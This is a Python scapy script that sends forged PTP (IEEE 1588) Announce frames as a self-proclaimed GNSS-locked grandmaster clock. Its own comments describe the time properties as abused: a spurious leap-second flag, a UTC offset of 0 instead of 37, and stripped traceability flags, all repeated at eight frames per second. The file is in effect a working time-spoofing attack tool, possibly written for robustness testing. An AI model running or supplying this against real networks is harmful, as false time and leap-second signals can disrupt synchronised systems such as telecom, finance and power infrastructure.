import sys,time,struct
from scapy.all import Ether,Raw,sendp
# argv: iface dur src_id_hex [gap_ms]
iface,dur,src_id = sys.argv[1],int(sys.argv[2]),sys.argv[3]
gap_ms = int(sys.argv[4]) if len(sys.argv)>4 else 125
src_mac = "02:00:00:00:00:"+src_id[-2:]
def announce(seq):
    # LEGAL header + legal clockClass/priority1, but abused timePropertiesDS:
    #   leap61=1 (spurious), currentUtcOffset=0 (true=37), timeTraceable/UTCvalid stripped.
    h=bytearray(34)
    h[0]=0x0B                          # messageType Announce(0xB)
    h[1]=0x02                          # versionPTP=2 (legal)
    struct.pack_into(">H",h,2,64)      # messageLength=64 (legal)
    h[4]=24                            # domain 24
    # flags: byte[6]=0, byte[7]=timeProperties flags:
    #   bit0 leap61=1, currentUtcOffsetValid(bit2)=0, ptpTimescale(bit3)=1,
    #   timeTraceable(bit4)=0, frequencyTraceable(bit5)=0
    h[6]=0x00; h[7]=0x08               # 0x08 = ptpTimescale set, leap61 set? set bit0 too
    h[7]=0x09                          # 0000 1001 = ptpTimescale(bit3)+leap61(bit0)
    h[20:28]=bytes.fromhex(src_id)     # provisioned GM identity
    struct.pack_into(">H",h,28,2)      # sourcePortNumber=2 (separate seq stream)
    struct.pack_into(">H",h,30,seq); h[32]=0x05; h[33]=0xFD  # logMessageInterval=-3 (8/s, legal) to isolate whole-second signal
    body=bytearray(30)
    struct.pack_into(">h",body,10,0)   # currentUtcOffset = 0 (WRONG; true TAI-UTC=37)
    body[13]=128                       # grandmasterPriority1=128 (legal)
    body[14]=6                         # grandmasterClockClass=6 (legal, claims PRTC-locked)
    body[15]=0x21; struct.pack_into(">H",body,16,0x4E5D)
    body[18]=128                       # grandmasterPriority2
    body[19:27]=bytes.fromhex(src_id)  # grandmasterIdentity = source (self-announce)
    struct.pack_into(">H",body,27,0)   # stepsRemoved=0
    body[29]=0x20                      # timeSource=GNSS(0x20)
    return bytes(h)+bytes(body)
t=time.time(); seq=0
while time.time()-t<dur:
    p=Ether(dst="01:1b:19:00:00:00",src=src_mac,type=0x88F7)/Raw(announce(seq%65536))
    sendp(p,iface=iface,count=1,verbose=0); seq+=1; time.sleep(gap_ms/1000.0)
